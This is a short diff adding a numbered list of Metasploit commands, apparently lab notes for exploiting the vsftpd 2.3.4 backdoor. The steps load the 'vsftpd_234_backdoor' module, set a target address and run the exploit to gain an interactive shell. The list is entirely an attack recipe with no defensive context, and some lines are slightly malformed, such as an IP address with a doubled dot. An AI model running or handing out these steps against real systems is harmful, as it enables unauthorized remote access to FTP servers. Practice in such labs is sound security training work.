@@ -1,0 +1,8 @@
+1.msfconsole
+2. search Vsftpd
+3.use exploit/unix/ftp/vsftpd_234_backdoor
+4.info 
+5.set RHOST 192.168..75.131
+6.info
+7.show payloads/cmd/unix/interact
+8.exploit
